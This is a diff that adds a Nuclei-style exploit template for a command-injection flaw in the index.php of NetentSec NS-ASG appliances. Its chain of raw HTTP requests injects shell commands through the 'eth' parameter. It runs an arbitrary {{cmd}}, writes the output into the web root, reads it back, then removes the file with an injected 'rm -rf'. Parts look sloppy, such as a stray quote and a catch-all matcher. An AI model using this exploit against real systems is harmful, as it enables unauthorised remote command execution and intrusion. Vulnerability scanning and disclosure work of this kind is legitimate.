@@ -1,0 +1,61 @@
+id: netentsec-ns-asg-index-rce
+info:
+  name: Netentsec NS ASG index.php RCE
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    NetentSec NS-ASG command injection vulnerability in index.php allowing remote code execution.
+  reference:
+    - http://wooyun.bystudent.com/static/bugs/wooyun-2014-058946.html
+  tags: rce
+
+variables:
+  fileName: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        GET /index.php?eth=eth0%20;expr+{{rand_int(1000000000,9999999999)}}+-+{{rand_int(100000000,999999999)}};" HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\d{10}"
+
+  - raw:
+      - |
+        GET /index.php?eth=eth0%20;{{cmd}}%3E/Isc/third-party/httpd/htdocs/{{fileName}}.txt;{{fileName}} HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: fileContent
+        regex:
+          - "vpnweb/index.php"
+        internal: true
+
+  - raw:
+      - |
+        GET /{{fileName}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "vpnweb/index.php"
+      - type: regex
+        regex:
+          - "(?s).*"
+    extractors:
+      - type: regex
+        name: output
+        regex:
+          - "(?s).*"
+
+  - raw:
+      - |
+        GET /index.php?eth=eth0%20;rm%20-rf%20/Isc/third-party/httpd/htdocs/{{fileName}}.txt;{{fileName}} HTTP/1.1
+        Host: {{Hostname}}
